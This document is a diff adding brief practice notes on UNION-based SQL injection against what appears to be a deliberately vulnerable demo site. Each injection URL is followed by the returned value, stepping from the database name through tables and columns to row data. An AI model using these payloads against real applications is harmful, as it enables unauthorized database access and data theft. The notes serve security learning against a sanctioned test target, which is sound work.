@@ -1,0 +1,22 @@
+svhttps://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+
+         
+
+
+http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%20NULL,%20%27q%27,NULL
+
+
+http://testphp.vulnweb.com/artists.php?artist=-2 UNION SELECT NULL,'q',NULL
+q
+
+http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%20NULL,%20database(),NULL
+acuart
+
+http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%20NULL,%20table_name,NULL%20FROM%20information_schema.tables
+artists
+
+http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%20NULL,%20column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27artists%27
+artist_id
+
+http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%20NULL,artist_id,NULL%20FROM%20artists
+1
